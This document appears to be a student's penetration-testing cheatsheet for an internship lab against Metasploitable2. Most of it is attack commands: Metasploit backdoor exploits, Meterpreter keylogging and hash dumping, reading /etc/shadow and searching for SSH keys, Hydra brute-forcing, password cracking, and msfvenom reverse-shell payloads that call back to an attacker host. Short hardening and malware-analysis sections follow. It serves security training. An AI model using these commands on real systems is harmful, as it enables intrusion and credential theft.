# Task 4 — Quick Reference Cheatsheet
> Exploitation & System Security | ApexPlanet Internship

---

## 🎯 Metasploit Quick Reference

```bash
# START
msfconsole
msfconsole -q          # Quiet mode (no banner)

# SEARCH & USE
search vsftpd
search type:exploit platform:linux
use exploit/unix/ftp/vsftpd_234_backdoor
info                   # Module details
show options           # Required options
show payloads          # Compatible payloads

# SET OPTIONS
set RHOSTS 192.168.93.129
set LHOST 192.168.93.128
set LPORT 4444
set PAYLOAD linux/x86/shell_reverse_tcp

# RUN
run
exploit
check                  # Check if target is vulnerable

# SESSIONS
sessions               # List sessions
sessions -i 1          # Interact with session 1
sessions -k 1          # Kill session 1
background             # Background current session

# METERPRETER
sysinfo                # System info
getuid                 # Current user
getpid                 # Process ID
ps                     # Process list
hashdump               # Dump hashes
shell                  # System shell
upload /path/file .    # Upload file
download file /path    # Download file
screenshot             # Screenshot
keyscan_start          # Start keylogger
keyscan_dump           # Dump keystrokes
```

---

## 💥 Key Metasploitable2 Exploits

```bash
# vsftpd 2.3.4 BACKDOOR (port 21)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.93.129
run
# → root shell

# SAMBA USERMAP SCRIPT (port 445)
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.93.129
set LHOST 192.168.93.128
run
# → root shell

# UNREAL IRCD BACKDOOR (port 6667)
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.93.129
run
# → root shell

# DISTCC DAEMON (port 3632)
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.93.129
run
# → daemon shell

# JAVA RMI (port 1099)
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.93.129
run
```

---

## 🔑 Post-Exploitation Commands

```bash
# SYSTEM INFO
id                         # Current user + groups
whoami                     # Username
uname -a                   # OS + kernel version
hostname                   # Machine name
cat /etc/os-release        # OS details

# USERS & PASSWORDS
cat /etc/passwd            # User accounts
cat /etc/shadow            # Password hashes (root needed)
cat /etc/group             # Groups
w                          # Logged in users
last                       # Login history

# NETWORK
ifconfig / ip a            # Network interfaces
netstat -tulpn             # Open ports
route                      # Routing table
arp -a                     # ARP cache (other hosts)
cat /etc/hosts             # Host file

# FILES & DIRS
find / -name "*.conf" 2>/dev/null    # Config files
find / -perm -4000 2>/dev/null       # SUID binaries
find / -name "id_rsa" 2>/dev/null    # SSH private keys
find / -name "*.php" 2>/dev/null     # PHP files
ls -la /home/                        # Home directories
history                              # Command history

# PROCESSES
ps aux                     # All processes
crontab -l                 # Scheduled jobs
cat /etc/crontab           # System crontab
```

---

## 🔨 Hydra Brute Force

```bash
# SSH
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.93.129
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 -V ssh://192.168.93.129

# FTP
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.93.129

# HTTP POST (DVWA login)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.93.129 http-post-form \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

# RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.93.129

# Multiple users + passwords
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.93.129

# FLAGS
# -l  single username      -L  username list
# -p  single password      -P  password list
# -t  threads              -V  verbose
# -s  custom port          -f  stop after first find
# -o  output file          -vV very verbose
```

---

## 🔓 John the Ripper

```bash
# BASIC CRACKING
john hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --show

# COMBINE PASSWD + SHADOW
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# SPECIFIC FORMATS
john --format=md5crypt hashes.txt --wordlist=rockyou.txt
john --format=sha512crypt hashes.txt --wordlist=rockyou.txt
john --format=bcrypt hashes.txt --wordlist=rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt   # Windows

# RULES (mangling)
john hashes.txt --wordlist=rockyou.txt --rules

# LIST FORMATS
john --list=formats

# RESTORE SESSION
john --restore
```

---

## 🔧 msfvenom Payload Generator

```bash
# LINUX REVERSE SHELL
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.93.128 LPORT=4444 -f elf > shell.elf

# LINUX METERPRETER
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=4444 -f elf > meter.elf

# WINDOWS REVERSE SHELL
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.93.128 LPORT=4444 -f exe > shell.exe

# WINDOWS METERPRETER
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=4444 -f exe > meter.exe

# PHP WEB SHELL
msfvenom -p php/reverse_php LHOST=192.168.93.128 LPORT=4444 -f raw > shell.php

# PYTHON
msfvenom -p cmd/unix/reverse_python LHOST=192.168.93.128 LPORT=4444 -f raw > shell.py

# LIST PAYLOADS
msfvenom --list payloads | grep linux
msfvenom --list payloads | grep windows
```

---

## 🛡️ System Hardening

```bash
# UFW FIREWALL
ufw enable
ufw status verbose
ufw allow ssh
ufw allow http
ufw allow https
ufw deny 23/tcp          # Block telnet
ufw deny 21/tcp          # Block FTP
ufw deny 3306/tcp        # Block MySQL
ufw allow from 192.168.93.128 to any port 22   # Allow specific IP
ufw delete allow http    # Remove rule
ufw reset                # Reset all rules

# SSH HARDENING (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
Protocol 2
Port 2222
AllowUsers manivel
systemctl restart ssh

# DISABLE SERVICES
systemctl stop telnet && systemctl disable telnet
systemctl stop vsftpd && systemctl disable vsftpd
systemctl stop rlogin && systemctl disable rlogin

# FIND RISKS
find / -perm -4000 -type f 2>/dev/null       # SUID files
find / -perm -o+w -type f 2>/dev/null        # World-writable
find / -user root -perm -o+w 2>/dev/null     # Root-owned writable

# UPDATES
apt update && apt upgrade -y
apt autoremove -y
```

---

## 🦠 Malware Analysis

```bash
# STATIC ANALYSIS
file sample                    # File type
strings sample | head -100     # Extract strings
strings sample | grep -i http  # Find URLs
strings sample | grep -i pass  # Find passwords
md5sum sample                  # MD5 hash
sha256sum sample               # SHA256 hash
readelf -h sample              # ELF header (Linux)
objdump -d sample | head -50   # Disassemble

# DYNAMIC ANALYSIS
strace ./sample 2>&1 | tee strace.txt     # System calls
ltrace ./sample 2>&1 | tee ltrace.txt    # Library calls
tcpdump -i eth0 -w traffic.pcap &        # Capture traffic
./sample                                  # Run sample
# Ctrl+C to stop tcpdump

# ONLINE SANDBOXES
# https://www.virustotal.com
# https://any.run
# https://www.hybrid-analysis.com
```

---

## 🧠 Pentest Phases

```
1. RECON       → whois, nslookup, shodan, google dorking
2. SCANNING    → nmap -sV -O -A target
3. EXPLOITATION → msfconsole, searchsploit, manual exploits
4. POST-EXPLOIT → hashdump, sysinfo, persistence, pivot
5. REPORTING   → document everything with screenshots
```

---

*Cheatsheet by Manivel R | ApexPlanet Internship 2026 | github.com/manivel-cyber-ai*
